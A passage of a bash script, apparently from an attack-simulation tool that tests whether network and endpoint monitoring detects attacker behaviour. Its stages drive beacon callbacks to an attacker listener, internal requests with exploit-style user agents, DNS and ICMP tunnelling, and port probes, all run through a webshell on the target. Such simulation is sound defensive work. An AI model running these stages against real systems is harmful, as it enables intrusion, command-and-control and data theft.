        if execute_external_beacon_callback "${i}" "${beacon_path}" "burst"; then
            success=$((success + 1))
        else
            failed=$((failed + 1))
        fi
        (( count > 1 )) && sleep_sec=$((window_sec / count))
        (( sleep_sec < 1 )) && sleep_sec=1
        sleep "${sleep_sec}"
    done
    BEACON_BURST_ATTEMPTED="${count}"
    BEACON_BURST_SUCCESS="${success}"
    BEACON_BURST_FAILED="${failed}"
    (( count > 0 )) && ratio=$((success * 100 / count))
    log_beacon_summary "burst" "${count}" "${success}" "${failed}" "${ratio}"
    CORRELATION_BEACON_CYCLES=$((success / 3 + 1))
}

stage_external_callback() {
    local attempted=0 connected=0 responses=0 attacker_host attacker_port cb_ratio=0 stage_duration=0 t0=0 t1=0
    add_executed_stage "External Callback"
    write_report_entries "external_callback" "T1071.001" "NDR/EDR" "External Callback" "${ATTACKER_BASE_URL}" "start" "attacker listener callback"
    attacker_host="${ATTACKER_BASE_URL#http://}"
    attacker_host="${attacker_host%%:*}"
    attacker_port="${ATTACKER_BASE_URL##*:}"
    EXTERNAL_CALLBACK_ATTEMPTED=0
    EXTERNAL_CALLBACK_CONNECTED=0
    EXTERNAL_CALLBACK_RESPONSES=0
    EXTERNAL_CALLBACK_FAILED=false
    CORRELATION_BEACON_CYCLES=0
    BEACON_LOW_SLOW_ATTEMPTED=0
    BEACON_LOW_SLOW_SUCCESS=0
    BEACON_LOW_SLOW_FAILED=0
    BEACON_BURST_ATTEMPTED=0
    BEACON_BURST_SUCCESS=0
    BEACON_BURST_FAILED=0

    log_message "OK" "External Callback: concentrated beacon on ${CALLBACK_PREFIX}/check-in (low_and_slow + burst modes)"
    if [[ "${DRY_RUN}" == true ]]; then
        BEACON_LOW_SLOW_ATTEMPTED=20
        BEACON_LOW_SLOW_SUCCESS=18
        BEACON_LOW_SLOW_FAILED=2
        BEACON_BURST_ATTEMPTED=60
        BEACON_BURST_SUCCESS=55
        BEACON_BURST_FAILED=5
        log_beacon_summary "low_and_slow" "${BEACON_LOW_SLOW_ATTEMPTED}" "${BEACON_LOW_SLOW_SUCCESS}" "${BEACON_LOW_SLOW_FAILED}" "90"
        log_beacon_summary "burst" "${BEACON_BURST_ATTEMPTED}" "${BEACON_BURST_SUCCESS}" "${BEACON_BURST_FAILED}" "91"
        EXTERNAL_CALLBACK_ATTEMPTED=$((BEACON_LOW_SLOW_ATTEMPTED + BEACON_BURST_ATTEMPTED))
        EXTERNAL_CALLBACK_CONNECTED=$((BEACON_LOW_SLOW_SUCCESS + BEACON_BURST_SUCCESS))
        EXTERNAL_CALLBACK_RESPONSES="${EXTERNAL_CALLBACK_CONNECTED}"
        EXTERNAL_CALLBACK_STATUS="success"
        CORRELATION_BEACON_CYCLES=5
        CORRELATION_CALLBACK_DONE=true
        compute_detection_score_beacon
        set_stage_result "External Callback" "Success" "dry-run concentrated beacon"
        save_external_callback_overlap_result
        return 0
    fi

    t0=$(date +%s)
    run_beacon_mode_low_and_slow
    run_beacon_mode_burst
    t1=$(date +%s)
    stage_duration=$((t1 - t0))
    attempted=$((BEACON_LOW_SLOW_ATTEMPTED + BEACON_BURST_ATTEMPTED))
    connected=$((BEACON_LOW_SLOW_SUCCESS + BEACON_BURST_SUCCESS))
    responses="${connected}"
    EXTERNAL_CALLBACK_ATTEMPTED="${attempted}"
    EXTERNAL_CALLBACK_CONNECTED="${connected}"
    EXTERNAL_CALLBACK_RESPONSES="${responses}"
    CORRELATION_CALLBACK_DONE=true
    (( attempted > 0 )) && cb_ratio=$((connected * 100 / attempted))
    BEACON_CALLBACK_RATIO="${cb_ratio}"
    if (( responses == 0 )); then
        EXTERNAL_CALLBACK_FAILED=true
        EXTERNAL_CALLBACK_STATUS="failed"
        log_message "WARN" "External Callback complete: attempted=${attempted} connected=${connected} (callback unreachable — likely firewall TCP/${attacker_port})"
        poc_obs_log "SUMMARY" "External Callback Failure Analysis Target=${attacker_host}:${attacker_port} Likely Cause=Firewall Drop or listener unreachable"
    else
        EXTERNAL_CALLBACK_STATUS="success"
        log_message "OK" "External Callback complete: attempted=${attempted} connected=${connected} low_slow=${BEACON_LOW_SLOW_SUCCESS}/${BEACON_LOW_SLOW_ATTEMPTED} burst=${BEACON_BURST_SUCCESS}/${BEACON_BURST_ATTEMPTED}"
    fi
    log_detection_quality "External Callback" "${attempted}" "${stage_duration}" "${ATTACKER_BASE_URL}" \
        "beacon_concentrated" "$([[ "${connected}" -ge 20 ]] && printf high || ([[ "${connected}" -ge 5 ]] && printf medium || printf low))" \
        "${connected} callbacks on single path within ${stage_duration}s"
    compute_detection_score_beacon
    set_stage_result "External Callback" "$([[ "${EXTERNAL_CALLBACK_STATUS}" == success ]] && printf Success || printf Partial)" \
        "attempted=${attempted} connected=${connected} low_slow=${BEACON_LOW_SLOW_SUCCESS}/${BEACON_LOW_SLOW_ATTEMPTED} burst=${BEACON_BURST_SUCCESS}/${BEACON_BURST_ATTEMPTED}"
    write_report_entries "external_callback" "T1071.001" "NDR/EDR" "External Callback" "${ATTACKER_BASE_URL}" "success" "callback done"
    save_external_callback_overlap_result
}

stage_internal_web_fanout() {
    local targets target_line host port scheme req_per_host total_targets=0 planned=0
    local stats attempted=0 responses connected n
    targets=$(collect_internal_fanout_targets)
    total_targets=$(count_hosts_blob "${targets}")
    INTERNAL_FANOUT_TARGETS="${total_targets}"
    if [[ -z "${targets}" || "${total_targets}" == 0 ]]; then
        INTERNAL_FANOUT_STATUS="skipped"
        add_skipped_stage "Internal Web Fanout" "No HTTP/HTTPS fanout targets"
        set_stage_result "Internal Web Fanout" "Skipped" "no web targets"
        save_internal_fanout_overlap_result
        return 0
    fi
    add_executed_stage "Internal Web Fanout"
    req_per_host="${INTERNAL_FANOUT_PER_TARGET}"
    planned=$((total_targets * req_per_host))
    INTERNAL_FANOUT_ATTEMPTED=0
    INTERNAL_FANOUT_CONNECTED=0
    INTERNAL_FANOUT_RESPONSES=0
    log_message "OK" "Internal Web Fanout: targets=${total_targets} requests_per_host=${req_per_host} planned=${planned}"
    if [[ "${DRY_RUN}" == true ]]; then
        INTERNAL_FANOUT_ATTEMPTED="${planned}"
        INTERNAL_FANOUT_CONNECTED="${planned}"
        INTERNAL_FANOUT_RESPONSES="${planned}"
        INTERNAL_FANOUT_STATUS="success"
        set_stage_result "Internal Web Fanout" "Success" "dry-run planned ${planned}"
        save_internal_fanout_overlap_result
        return 0
    fi
    if [[ "${HAS_curl:-false}" != true ]]; then
        log_message "WARN" "Internal Web Fanout: remote curl missing — limited fanout"
        add_fallback_usage "Internal web fanout: remote curl missing"
    fi
    while IFS= read -r target_line; do
        [[ -z "${target_line}" ]] && continue
        pipeline_stop_requested && break
        if read -r host port scheme <<< "$(web_target_parse_line "${target_line}" "http" 2>/dev/null)"; then
            :
        elif read -r host port scheme <<< "$(web_target_parse_line "${target_line}" "https" 2>/dev/null)"; then
            :
        else
            continue
        fi
        if [[ "${HAS_curl:-false}" == true ]]; then
            stats=$(execute_internal_fanout_chunked "${host}" "${port}" "${scheme}" "${req_per_host}" "${CAMPAIGN_ID}")
            read -r n responses connected jndi ognl spring <<< "$(parse_fanout_stats_line "${stats}")"
            if (( n == 0 )); then
                stats=$(run_webshell_long "fanout-mono-${host}-${port}" "$(build_internal_fanout_curl_cmd "${host}" "${port}" "${req_per_host}" "${scheme}" "${CAMPAIGN_ID}")" 2>/dev/null || true)
                ingest_http_attack_remote_output "${stats}" "${host}"
                read -r n responses connected jndi ognl spring <<< "$(parse_fanout_stats_line "${stats}")"
            fi
            sanitize_stats_ints n responses connected jndi ognl spring
            attempted=$((attempted + n))
            INTERNAL_FANOUT_RESPONSES=$((INTERNAL_FANOUT_RESPONSES + responses))
            INTERNAL_FANOUT_CONNECTED=$((INTERNAL_FANOUT_CONNECTED + connected))
            FANOUT_UA_JNDI_STYLE_COUNT=$((FANOUT_UA_JNDI_STYLE_COUNT + jndi))
            FANOUT_UA_OGNL_STYLE_COUNT=$((FANOUT_UA_OGNL_STYLE_COUNT + ognl))
            FANOUT_UA_SPRING_STYLE_COUNT=$((FANOUT_UA_SPRING_STYLE_COUNT + spring))
        fi
    done <<< "${targets}"
    INTERNAL_FANOUT_ATTEMPTED="${attempted}"
    INTERNAL_FANOUT_STATUS=$(internal_fanout_stage_status)
    log_message "OK" "Internal Web Fanout complete: targets=${INTERNAL_FANOUT_TARGETS} attempted=${INTERNAL_FANOUT_ATTEMPTED} connected=${INTERNAL_FANOUT_CONNECTED} responses=${INTERNAL_FANOUT_RESPONSES} status=${INTERNAL_FANOUT_STATUS} jndi_ua=${FANOUT_UA_JNDI_STYLE_COUNT} ognl_ua=${FANOUT_UA_OGNL_STYLE_COUNT} spring_ua=${FANOUT_UA_SPRING_STYLE_COUNT}"
    if (( INTERNAL_FANOUT_TARGETS > 0 && INTERNAL_FANOUT_ATTEMPTED == 0 )); then
        set_stage_result "Internal Web Fanout" "Failed" "INTERNAL FANOUT EXECUTION FAILURE — targets=${INTERNAL_FANOUT_TARGETS} attempted=0"
        log_message "ERROR" "INTERNAL FANOUT EXECUTION FAILURE — targets=${INTERNAL_FANOUT_TARGETS} attempted=0"
    else
        set_stage_result "Internal Web Fanout" "$([[ "${INTERNAL_FANOUT_STATUS}" == success ]] && printf Success || printf Partial)" "fanout attempted=${INTERNAL_FANOUT_ATTEMPTED} status=${INTERNAL_FANOUT_STATUS}"
    fi
    write_report_entries "internal_fanout" "T1071.001" "NDR/WAF" "Internal Callback Fanout" "multi" "success" "internal fanout"
    save_internal_fanout_overlap_result
}

stage_dns_tunnel_enhanced() {
    local count="${DNS_TUNNEL_QUERY_COUNT}" dns_hosts out stats sim_rc=0
    local attempted=0 eff_tld=0 cluster_local=0 powerapps=0 suspicious_tld=0 https_cnt=0 entropy=0
    local a_cnt=0 txt_cnt=0 aaaa_cnt=0 cc=0 to=0 top=0 xyz=0 nx_cnt=0
    local dns_probe_server="" enh_ran=false
    add_executed_stage "DNS Tunnel Enhanced"
    write_report_entries "dns_tunnel_enhanced" "T1071.004" "NDR/SIEM" "DNS Tunnel" "${TARGET_NET}" "start" "Stellar-pattern multi-mode DNS tunnel simulation"
    count=$(safe_int "${count}")
    (( count < DNS_TUNNEL_MIN_QUERIES )) && count="${DNS_TUNNEL_MIN_QUERIES}"
    DNS_QUERIES_PLANNED="${count}"
    reset_dns_tunnel_execution_stats
    DNS_A_QUERIES=0
    DNS_TXT_QUERIES=0
    DNS_AAAA_QUERIES=0
    DNS_NXDOMAIN_STYLE=0
    DNS_HIGH_ENTROPY_LABELS=0
    DNS_EFFECTIVE_TLD_COUNT=0
    DNS_CLUSTER_LOCAL_COUNT=0
    DNS_POWERAPPS_STYLE_COUNT=0
    DNS_SUSPICIOUS_TLD_COUNT=0
    DNS_HTTPS_QUERY_COUNT=0
    DNS_TOTAL_ENTROPY_STYLE_COUNT=0
    DNS_TUNNEL_POST_FALLBACK_USED=false
    reset_dns_tunnel_enhanced_fallback_stats
    local enhanced_mode="${DNS_TUNNEL_MODE}"
    [[ "${enhanced_mode}" == auto ]] && enhanced_mode="all"
    log_message "OK" "DNS Tunnel Enhanced: planned=${DNS_QUERIES_PLANNED} queries (modes=${enhanced_mode}; chunked enhanced execution)"
    if [[ "${DRY_RUN}" == true ]]; then
        run_dns_tunnel_simulation "${count}" "${enhanced_mode}" || true
        snapshot_dns_tunnel_enhanced_run_stats 0 true
        apply_dns_tunnel_enhanced_final_decision
        followup_record_dns "${DNS_QUERIES_ATTEMPTED:-0}"
        case "${DNS_TUNNEL_FINAL_RESULT:-failed}" in
            success) set_stage_result "DNS Tunnel Enhanced" "Success" "dry-run enhanced_attempted=${DNS_TUNNEL_ENH_ATTEMPTED}" ;;
            partial) set_stage_result "DNS Tunnel Enhanced" "Partial" "dry-run ${DNS_TUNNEL_FINAL_REASON}" ;;
            skipped) set_stage_result "DNS Tunnel Enhanced" "Skipped" "dry-run ${DNS_TUNNEL_FINAL_REASON}" ;;
            *) set_stage_result "DNS Tunnel Enhanced" "Failed" "dry-run ${DNS_TUNNEL_FINAL_REASON:-no_queries}" ;;
        esac
        save_dns_tunnel_overlap_result
        return 0
    fi
    if [[ "${HAS_dig:-false}" != true && "${HAS_nslookup:-false}" != true && "${HAS_host:-false}" != true && "${HAS_python3:-false}" != true ]]; then
        DEGRADED_TELEMETRY=true
        DNS_TUNNEL_STAGE_STATUS="degraded"
        DNS_TUNNEL_SKIP_REASON="dig/nslookup/host/python3 missing on webshell host"
        add_fallback_usage "DNS tunnel enhanced: dig/nslookup/host/python3 missing — degraded telemetry"
        log_message "WARN" "DNS Tunnel Enhanced: degraded telemetry — ${DNS_TUNNEL_SKIP_REASON}"
        set_stage_result "DNS Tunnel Enhanced" "Partial" "degraded telemetry — DNS capability missing"
        save_dns_tunnel_overlap_result
        return 0
    fi
    if ! dns_probe_server=$(select_dns_tunnel_target); then
        dns_probe_server=""
    fi
    dns_probe_server=$(poc_extract_ipv4 "${dns_probe_server}")
    if [[ -z "${dns_probe_server}" ]]; then
        dns_probe_server=$(discover_dns_resolver_from_webshell)
        dns_probe_server=$(poc_extract_ipv4 "${dns_probe_server}")
        dns_resolver_is_stub "${dns_probe_server}" && dns_probe_server=""
    fi
    if [[ -z "${dns_probe_server}" && -n "${DNS_TUNNEL_USER_SERVER}" ]]; then
        dns_probe_server=$(poc_extract_ipv4 "${DNS_TUNNEL_USER_SERVER}")
    fi
    if [[ -z "${dns_probe_server}" ]]; then
        dns_probe_server=$(poc_extract_ipv4 "${DNS_UPSTREAM_DNS:-}")
    fi
    if [[ -n "${dns_probe_server}" ]]; then
        validate_dns_server_remote "${dns_probe_server}" "enhanced-preflight" >/dev/null 2>&1 || \
            dns_tunnel_log_both "enhanced preflight validation failed for ${dns_probe_server}; continuing with chunked execution anyway"
        log_dns_tunnel_selected_resolver "${dns_probe_server}" "${DNS_TUNNEL_RESOLVER_SOURCE:-target_dns}" "enhanced_chunked_primary"
    else
        dns_tunnel_log_both "enhanced no explicit resolver selected; attempting resolver discovery during fallback"
    fi
    sim_rc=1
    if [[ -n "${dns_probe_server}" ]]; then
        enh_ran=true
        execute_dns_tunnel_simulation_chunked "${count}" "${enhanced_mode}" "${dns_probe_server}" "${CAMPAIGN_ID}" && sim_rc=0 || sim_rc=$?
    else
        DNS_TUNNEL_ENH_RESULT="failed"
        DNS_TUNNEL_ENH_REASON="no_resolver_selected"
        DNS_TUNNEL_SKIP_REASON="no_resolver_selected"
    fi
    snapshot_dns_tunnel_enhanced_run_stats "${sim_rc}" "${enh_ran}"
    record_dns_tunnel_enhanced_result

    dns_hosts=$(collect_dns_tunnel_targets)
    if (( DNS_TUNNEL_ENH_ATTEMPTED == 0 )); then
        DNS_TUNNEL_FB_USED="yes"
        DNS_TUNNEL_FB_REASON="${DNS_TUNNEL_ENH_REASON:-${DNS_TUNNEL_SKIP_REASON:-enhanced_all_chunks_failed}}"
        dns_tunnel_log_both "enhanced exhausted with attempted=0; fallback chunked dig (reason=${DNS_TUNNEL_FB_REASON})"
        local fb_server="${dns_probe_server:-${DNS_TARGET_SERVER}}"
        fb_server=$(poc_extract_ipv4 "${fb_server}")
        if [[ -z "${fb_server}" ]]; then
            fb_server=$(discover_dns_resolver_from_webshell)
            fb_server=$(poc_extract_ipv4 "${fb_server}")
            dns_resolver_is_stub "${fb_server}" && fb_server=""
            [[ -n "${fb_server}" ]] && log_dns_tunnel_selected_resolver "${fb_server}" "system_resolver" "enhanced_chunked_fallback"
        fi
        if [[ "${HAS_dig:-false}" == true && -n "${fb_server}" ]]; then
            out=$(execute_dns_tunnel_enhanced_chunked "${count}" "${CAMPAIGN_ID}" dig "${fb_server}" "${DNS_TUNNEL_DOMAIN_SUFFIX}")
            read -r attempted eff_tld cluster_local powerapps suspicious_tld https_cnt entropy a_cnt txt_cnt aaaa_cnt cc to top xyz nx_cnt <<< "$(parse_dns_enhanced_stats_line "${out}")"
            sanitize_stats_ints attempted eff_tld cluster_local powerapps suspicious_tld https_cnt entropy a_cnt txt_cnt aaaa_cnt cc to top xyz nx_cnt
        elif [[ "${HAS_nslookup:-false}" == true && -n "${fb_server}" ]]; then
            out=$(execute_dns_tunnel_enhanced_chunked "${count}" "${CAMPAIGN_ID}" nslookup "${fb_server}" "${DNS_TUNNEL_DOMAIN_SUFFIX}")
            read -r attempted eff_tld cluster_local powerapps suspicious_tld https_cnt entropy a_cnt txt_cnt aaaa_cnt cc to top xyz nx_cnt <<< "$(parse_dns_enhanced_stats_line "${out}")"
            sanitize_stats_ints attempted eff_tld cluster_local powerapps suspicious_tld https_cnt entropy a_cnt txt_cnt aaaa_cnt cc to top xyz nx_cnt
        else
            attempted=0
        fi
        DNS_TUNNEL_FB_ATTEMPTED=$(safe_int "${attempted}")
        DNS_TUNNEL_FB_SUCCESS=$(safe_int "${attempted}")
        DNS_TUNNEL_FB_FAIL=0
        DNS_TUNNEL_FB_NX=$(safe_int "${nx_cnt}")
        DNS_TUNNEL_FB_TIMEOUT=0
        if (( DNS_TUNNEL_FB_ATTEMPTED > 0 )); then
            DNS_TUNNEL_FB_RESULT="success"
            DNS_TUNNEL_NXDOMAIN_COUNT="${DNS_TUNNEL_FB_NX}"
            DNS_TUNNEL_UNIQUE_QUERIES="${DNS_TUNNEL_FB_ATTEMPTED}"
        else
            DNS_TUNNEL_FB_RESULT="failed"
        fi
        apply_dns_enhanced_stats_to_globals "${attempted}" "${eff_tld}" "${cluster_local}" "${powerapps}" "${suspicious_tld}" "${https_cnt}" "${entropy}" "${a_cnt}" "${txt_cnt}" "${aaaa_cnt}"
    else
        DNS_TUNNEL_FB_USED="no"
        DNS_TUNNEL_FB_REASON="enhanced_success"
        DNS_TUNNEL_FB_RESULT="skipped"
    fi
    record_dns_tunnel_fallback_result
    DNS_NXDOMAIN_STYLE="${DNS_TUNNEL_NXDOMAIN_COUNT:-0}"
    followup_record_dns "$((DNS_TUNNEL_ENH_ATTEMPTED + DNS_TUNNEL_FB_ATTEMPTED))"
    apply_dns_tunnel_enhanced_final_decision
    log_dns_tunnel_final_summary "${DNS_TUNNEL_FINAL_RESULT:-failed}"
    log_message "OK" "DNS Tunnel Enhanced complete: planned=${DNS_QUERIES_PLANNED} attempted=${DNS_QUERIES_ATTEMPTED} enhanced=${DNS_TUNNEL_ENH_ATTEMPTED} fallback=${DNS_TUNNEL_FB_ATTEMPTED} final=${DNS_TUNNEL_FINAL_RESULT} mode=${DNS_TUNNEL_FINAL_SUCCESSFUL_MODE} server=${DNS_TARGET_SERVER} A=${DNS_A_QUERIES} TXT=${DNS_TXT_QUERIES} nx=${DNS_TUNNEL_NXDOMAIN_COUNT} entropy~=${DNS_TUNNEL_APPROX_ENTROPY}"
    write_report_entries "dns_tunnel_enhanced" "T1071.004" "NDR/SIEM" "DNS Tunnel" "${TARGET_NET}" "${DNS_TUNNEL_FINAL_RESULT:-failed}" "enhanced dns simulation final=${DNS_TUNNEL_FINAL_RESULT:-failed}"
    save_dns_tunnel_overlap_result
}

stage_icmp_tunnel_simulation() {
    local degraded_reason=""
    add_executed_stage "ICMP Tunnel Simulation"
    write_report_entries "icmp_tunnel" "T1048" "NDR" "ICMP Exfiltration Simulation" "multi" "start" "large-payload ICMP anomaly simulation via webshell"
    run_icmp_tunnel_simulation || degraded_reason="${ICMP_SKIP_REASON:-simulation failed}"
    icmp_build_final_snapshot
    validate_icmp_final_state || true
    icmp_emit_execution_evidence
    icmp_emit_tunnel_final_summary
    finalize_icmp_tunnel_stage_status "${degraded_reason}"
    icmp_emit_customer_summary
    write_report_entries "icmp_tunnel" "T1048" "NDR" "ICMP Exfiltration Simulation" "multi" "${ICMP_TUNNEL_STAGE_STATUS}" "mode=${ICMP_MODE_USED:-${ICMP_TUNNEL_MODE}} target=$(icmp_format_log_target)"
    poc_run_icmp_tunnel_live_log_validation || true
    save_icmp_tunnel_overlap_result
}

poc_collect_icmp_tunnel_live_log() {
    local line="" stage_line=""
    line=$(read_state_file_or_none "icmp_tunnel_simulation.log" | grep -E 'ICMP_|ROOT_CAUSE|DETECTION_WINDOW_SUMMARY|DETECTION_QUALITY|DETECTION_SCORE|LIVE_LOG_VALIDATION|Detection Readiness' | tail -n300 || true)
    if [[ -z "${line}" && -n "${LOG_DIR}" && -f "${LOG_DIR}/icmp_tunnel_simulation.log" ]]; then
        line=$(grep -E 'ICMP_|ROOT_CAUSE|DETECTION_WINDOW_SUMMARY|DETECTION_QUALITY|DETECTION_SCORE|LIVE_LOG_VALIDATION|Detection Readiness' "${LOG_DIR}/icmp_tunnel_simulation.log" 2>/dev/null | tail -n300 || true)
    fi
    stage_line=$(poc_live_log_stage_line_from_state "ICMP Tunnel Simulation" 2>/dev/null || true)
    printf '%s\n%s\n' "${line}" "${stage_line}"
}

poc_run_icmp_tunnel_live_log_validation() {
    local log_path="" err="" report_status="skipped"
    [[ "${DRY_RUN}" == true ]] && {
        poc_emit_live_log_validation "icmp_tunnel" "skipped" "dry_run"
        return 0
    }
    if [[ "${ICMP_TUNNEL_STAGE_STATUS}" == skipped ]]; then
        poc_emit_live_log_validation "icmp_tunnel" "skipped" "${ICMP_SKIP_REASON:-stage_skipped}"
        return 0
    fi
    log_path=$(poc_collect_icmp_tunnel_live_log)
    if poc_validate_icmp_tunnel_live_log "${log_path}" err; then
        poc_emit_live_log_validation "icmp_tunnel" "passed" "${err}"
        return 0
    fi
    poc_emit_live_log_validation "icmp_tunnel" "failed" "${err}"
    return 1
}

stage_nonstandard_port_followup() {
    local hosts host port ports ephemeral ports_cmd out connections=0 wave
    local -a fixed_ports=(5985 5986 8888 9000 10443 18080 31337)
    local -a ephemeral_ports=(49152 49500 50000 55000 60000 65000)
    add_executed_stage "Non-Standard Port Follow-up"
    write_report_entries "nonstandard_port" "T1046" "NDR" "Non-Standard Port Anomaly" "multi" "start" "wave reconnect probes"
    NONSTANDARD_PORT_CONNECTIONS=0
    hosts=$(collect_nonstandard_port_hosts)
    log_message "OK" "Non-Standard Port follow-up: hosts=$(count_hosts_blob "${hosts}") fixed_ports=${#fixed_ports[@]} ephemeral_ports=${#ephemeral_ports[@]}"
    if [[ "${DRY_RUN}" == true ]]; then
        NONSTANDARD_PORT_CONNECTIONS=$(( $(count_hosts_blob "${hosts}") * (${#fixed_ports[@]} + ${#ephemeral_ports[@]}) * 3 ))
        (( NONSTANDARD_PORT_CONNECTIONS < 1 )) && NONSTANDARD_PORT_CONNECTIONS=42
        set_stage_result "Non-Standard Port Follow-up" "Success" "dry-run planned ${NONSTANDARD_PORT_CONNECTIONS}"
        save_nonstandard_port_overlap_result
        return 0
    fi
    ports="${fixed_ports[*]} ${ephemeral_ports[*]}"
    ports_cmd="${REMOTE_SHELL_HELPERS} c=0; campaign='${CAMPAIGN_ID}'; "
    while IFS= read -r host; do
        [[ -z "${host}" ]] && continue
        [[ "${host}" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]] || continue
        ip_in_target_net "${host}" || continue
        for wave in 1 2 3; do
            for port in ${ports}; do
                ports_cmd+="poc_port_probe '${host}' '${port}' && c=\$((c+1)) || true; "
            done
            ports_cmd+="sleep \$((1 + RANDOM % 2)); "
        done
        connections=$((connections + (${#fixed_ports[@]} + ${#ephemeral_ports[@]}) * 3))
    done <<< "${hosts}"
    ports_cmd+="echo NONSTANDARD_PORT_STATS connections=\$c campaign=\${campaign}"
    out=$(run_webshell_long "nonstandard-port-wave" "${ports_cmd}" 2>/dev/null || true)
    if [[ "${out}" == *"NONSTANDARD_PORT_STATS"* ]]; then
        NONSTANDARD_PORT_CONNECTIONS=$(safe_int "$(sed -n 's/.*connections=\([0-9][0-9]*\).*/\1/p' <<< "${out}")")
    fi
    (( NONSTANDARD_PORT_CONNECTIONS < 1 )) && NONSTANDARD_PORT_CONNECTIONS="${connections}"
    log_message "OK" "Non-Standard Port follow-up complete: connections=${NONSTANDARD_PORT_CONNECTIONS}"
    set_stage_result "Non-Standard Port Follow-up" "Success" "connections=${NONSTANDARD_PORT_CONNECTIONS}"
    write_report_entries "nonstandard_port" "T1046" "NDR" "Non-Standard Port Anomaly" "multi" "success" "wave port probes"
    save_nonstandard_port_overlap_result
}

stage_correlation_telemetry_bundle() {
    log_message "STAGE" "Correlation telemetry chain (callback → fanout → DNS → ICMP → non-standard ports)"
    add_executed_stage "Correlation Telemetry Chain"
    if [[ "${CORRELATION_OVERLAP_LAUNCHED}" == true ]]; then
        if [[ "${CORRELATION_CALLBACK_DONE}" != true ]]; then
            stage_external_callback
            maybe_run_internal_web_fanout_fallback
        elif (( EXTERNAL_CALLBACK_CONNECTED == 0 && INTERNAL_FANOUT_ATTEMPTED == 0 )); then
            maybe_run_internal_web_fanout_fallback
        fi
        write_report_entries "correlation_chain" "TA0011" "XDR/NDR/SIEM" "Correlation Telemetry" "multi" "success" "overlap chain (DNS/ICMP/ports concurrent with HTTP/SSH)"
        return 0
    fi
    if [[ "${PIPELINE_OVERLAP}" == true && "${DRY_RUN}" != true ]]; then
        CORRELATION_OVERLAP_LAUNCHED=true
        run_stage_concurrent "Enhanced DNS Tunnel" stage_dns_tunnel_enhanced
        if [[ "${DGA_SIMULATION_ENABLED}" == true ]]; then
            run_stage_concurrent "DGA Simulation" followup_stage_dga
        fi
        run_stage_concurrent "ICMP Tunnel Simulation" stage_icmp_tunnel_simulation
        run_stage_concurrent "Non-Standard Port Follow-up" stage_nonstandard_port_followup
        run_stage_concurrent "External Callback" stage_external_callback
        wait_all_humanize_workers
        maybe_run_internal_web_fanout_fallback
    else
        stage_external_callback
        maybe_run_internal_web_fanout_fallback
        stage_dns_tunnel_enhanced
        if [[ "${DGA_SIMULATION_ENABLED}" == true ]]; then
            followup_stage_dga
        fi
        stage_icmp_tunnel_simulation
        stage_nonstandard_port_followup
    fi
    write_report_entries "correlation_chain" "TA0011" "XDR/NDR/SIEM" "Correlation Telemetry" "multi" "success" "callback+dns+icmp+ports chain"
    emit_poc_customer_explanation
}

simulate_correlation_telemetry_dry_run() {
    [[ "${DRY_RUN}" != true ]] && return 0
    local fanout_targets fanout_n
    fanout_targets=$(collect_internal_fanout_targets)
    fanout_n=$(count_hosts_blob "${fanout_targets}")
    EXTERNAL_CALLBACK_ATTEMPTED="${BEACON_COUNT}"
    EXTERNAL_CALLBACK_CONNECTED="${BEACON_COUNT}"
    EXTERNAL_CALLBACK_RESPONSES="${BEACON_COUNT}"
    EXTERNAL_CALLBACK_STATUS="success"
    EXTERNAL_CALLBACK_FAILED=false
    INTERNAL_FANOUT_TARGETS="${fanout_n}"
    if (( fanout_n > 0 )); then
        INTERNAL_FANOUT_ATTEMPTED=$((fanout_n * INTERNAL_FANOUT_PER_TARGET))
        INTERNAL_FANOUT_CONNECTED="${INTERNAL_FANOUT_ATTEMPTED}"
        INTERNAL_FANOUT_RESPONSES="${INTERNAL_FANOUT_ATTEMPTED}"
        INTERNAL_FANOUT_STATUS="success"
    else
        INTERNAL_FANOUT_STATUS="skipped"
    fi
    DNS_QUERIES_PLANNED="${DNS_TUNNEL_QUERY_COUNT}"
    DNS_TUNNEL_ENH_ATTEMPTED="${DNS_TUNNEL_QUERY_COUNT}"
    DNS_TUNNEL_ENH_SUCCESS="${DNS_TUNNEL_QUERY_COUNT}"
    DNS_TUNNEL_ENH_RESULT="success"
    DNS_TUNNEL_ENH_REASON="dry_run_synthetic"
    DNS_TUNNEL_FB_ATTEMPTED=0
    DNS_TUNNEL_FB_RESULT="skipped"
    DNS_QUERIES_ATTEMPTED="${DNS_TUNNEL_QUERY_COUNT}"
    DNS_RESPONSES_RECEIVED="${DNS_TUNNEL_QUERY_COUNT}"
    DNS_TUNNEL_FINAL_RESULT="success"
    DNS_TUNNEL_STAGE_STATUS="success"
    DNS_A_QUERIES=$((DNS_TUNNEL_QUERY_COUNT * 4 / 10))
    DNS_TXT_QUERIES=$((DNS_TUNNEL_QUERY_COUNT * 3 / 10))
    DNS_AAAA_QUERIES=$((DNS_TUNNEL_QUERY_COUNT * 2 / 10))
    DNS_HTTPS_QUERY_COUNT=$((DNS_TUNNEL_QUERY_COUNT / 10))
    DNS_EFFECTIVE_TLD_COUNT="${DNS_TUNNEL_QUERY_COUNT}"
    DNS_CLUSTER_LOCAL_COUNT=$((DNS_TUNNEL_QUERY_COUNT * 35 / 100))
    DNS_POWERAPPS_STYLE_COUNT=$((DNS_TUNNEL_QUERY_COUNT * 25 / 100))
    DNS_SUSPICIOUS_TLD_COUNT=$((DNS_TUNNEL_QUERY_COUNT * 20 / 100))
    DNS_TOTAL_ENTROPY_STYLE_COUNT=$((DNS_TUNNEL_QUERY_COUNT * 30 / 100))
    DNS_HIGH_ENTROPY_LABELS="${DNS_TOTAL_ENTROPY_STYLE_COUNT}"
    DNS_TLD_CC_COUNT="${DNS_SUSPICIOUS_TLD_COUNT}"
    DNS_TLD_TO_COUNT=0
    DNS_TLD_TOP_COUNT=0
    DNS_TLD_XYZ_COUNT=0
    DNS_NXDOMAIN_STYLE=0
    run_icmp_tunnel_simulation || true
    (( ICMP_TARGET_COUNT < 1 )) && ICMP_TARGET_COUNT=1
    ICMP_TARGETS="${ICMP_TARGET_COUNT}"
    NONSTANDARD_PORT_CONNECTIONS=$((fanout_n * 52 + 20))
    CORRELATION_BEACON_CYCLES=$((BEACON_COUNT / 3 + 1))
    FANOUT_UA_JNDI_STYLE_COUNT=$((INTERNAL_FANOUT_ATTEMPTED / 5))
    FANOUT_UA_OGNL_STYLE_COUNT=$((INTERNAL_FANOUT_ATTEMPTED / 12))
    FANOUT_UA_SPRING_STYLE_COUNT=$((INTERNAL_FANOUT_ATTEMPTED / 12))
    if [[ "${DGA_SIMULATION_ENABLED}" == true ]]; then
        run_dga_simulation || true
    fi
}

format_correlation_telemetry_summary_block() {
